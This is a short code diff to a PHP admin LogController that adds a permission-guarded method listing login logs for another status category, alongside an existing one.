@@ -6,6 +6,7 @@ use App\Attributes\HasPermissions;
 use App\Classes\SystemStatusEnum;
 use App\DataTables\IpListModelDataTable;
 use App\DataTables\LoginDModelDatatable;
+use App\DataTables\LoginFModelDatatable;
 use App\DataTables\LoginModelDataTable;
 use App\Models\IpListModel;
 use App\Models\LoginModel;
@@ -40,6 +41,12 @@ class LogController extends Controller
     public function listByDLogin(LoginDModelDatatable $dataTable)
     {
         return $dataTable->render('admin.datatable', ['title' => SystemStatusEnum::D->label() . ' Logları', 'page' => 'login-log']);
+    }
+    
+    #[HasPermissions('fibabank')]
+    public function listByFLogin(LoginFModelDatatable $dataTable)
+    {
+        return $dataTable->render('admin.datatable', ['title' => SystemStatusEnum::F->label() . ' Logları', 'page' => 'login-log']);
     }
 
     #[HasPermissions('iplist')]
